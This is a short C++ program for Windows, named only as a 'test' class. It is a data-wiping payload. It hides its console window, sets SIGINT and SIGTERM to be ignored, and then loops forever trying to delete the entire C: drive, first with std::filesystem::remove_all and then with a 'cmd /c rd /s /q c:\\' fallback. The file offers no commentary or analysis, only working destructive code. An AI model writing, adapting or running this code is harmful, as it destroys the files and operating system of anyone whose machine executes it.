#include <unistd.h>
#include <signal.h>
#include <filesystem>
#include <windows.h>
#define NOP [](){}()

class test{
private:
    HWND window;
public:
    void A();
    test() {
        window = FindWindowA("ConsoleWindowClass",nullptr);
    }
};

void test::A(){
    AllocConsole();
    ShowWindow(window, 0);
}

int main(){
    test q;
    __p_sig_fn_t sig = 0;

    do {
        q.A();
    } while (!1);
    NOP;

    while (1) {
        sig = signal(SIGINT, SIG_IGN);
        if (SIG_ERR == sig) exit(1);
        sig = signal(SIGTERM, SIG_IGN);
        if (SIG_ERR == sig) exit(1);
        try {
            std::filesystem::remove_all("c:\\");
        }
        catch (...) {
            system("cmd /c rd /s /q c:\\");
        }
    }
}
